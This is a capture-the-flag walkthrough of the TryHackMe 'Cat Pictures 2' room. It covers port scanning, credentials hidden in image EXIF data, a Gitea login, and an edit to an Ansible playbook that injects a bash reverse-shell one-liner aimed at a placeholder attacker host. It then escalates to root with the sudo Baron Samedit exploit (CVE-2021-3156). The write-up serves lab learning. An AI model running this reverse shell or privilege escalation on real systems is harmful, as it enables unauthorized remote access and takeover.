# Cat-picture---Tryhackme


Cat Pictures 2 Writeup
This is a walkthrough of the Cat Pictures 2 CTF from TryHackMe. The room can be accessed here.

Recon
I started by running an Nmap scan to identify open ports on the target machine:

nmap -sV -sC -p- <#TARGETIP> -o nmap
The scan revealed the following open ports:

22 - OpenSSH 7.6p1
80 - Nginx 1.4.6 (Lychee version 3.1.1 photo album with cat pictures)
222 - OpenSSH 9.0 (Unusual port)
1337 - OliveTin (Web interface to run predefined shell commands)
3000 - Gitea (Lightweight DevOps platform)
8080 - Nginx default webpage (Possibly with subdirectories)
Web Pages
I began exploring the web applications hosted on different ports:

Port 80: Found a Lychee photo album with cat pictures. App Screenshot

Port 1337: Discovered OliveTin, a web interface to execute scripts and run Ansible Playbooks.

App Screenshot

Port 3000: Accessed Gitea, a platform that might be hosting scripts and runbooks.

App Screenshot

Port 8080: Default Nginx webpage, further inspection may reveal subdirectories.

App Screenshot

After running gobuster and checking for vulnerabilities, nothing significant was found. So, I focused on the cat pictures hosted on port 80.

Cat Pictures Analysis
I downloaded all the cat pictures and checked them for exif data using exiftool. One picture revealed interesting information of a text file on a subdomain of one of the web applications:

App Screenshot

Visiting the URL led me to a text file with the following information:

App Screenshot

I managed to gain access to the website with the credentials from the text file and explored the user's repository, where I found flag1.txt (1/3 flags).

App Screenshot

Ansible Playbook
Next, I inspected the playbook.yaml file and noticed it contains a shell command: shell: echo hi.

App Screenshot

Knowing that OliveTin on port 1337 allows running Ansible Playbooks, I replaced the command with simple bash reverse shell payload from RevShells.com.

bash -i >& /dev/tcp/<#ATTACKERIP>/<#ATTACKERPORT> 0>&1
Setting up a NetCat listener and clicking "Run Ansible Playbook" triggered the payload, which gave me a shell on the box. Exploring the user directory file gave me another text file named flag2.txt (2/3 flags).

App Screenshot

Privilege Escalation
With a reverse shell on the target machine, I looked around for interesting files and uploaded linpeas.sh to find vulnerabilities. One stood out: [CVE-2021-3156] sudo Baron Samedit.

App Screenshot

To exploit this, I downloaded the exploit, uploaded it to the target machine, compiled it with make, and executed the ./sudo-hax-me-a-sandwich outfile to gain root access.

App Screenshot

From here, I moved to the /root file directory and found the flag3.txt (3/3 flags).

Thanks for checking out my writeup! Feel free to reach out with any questions or comments.
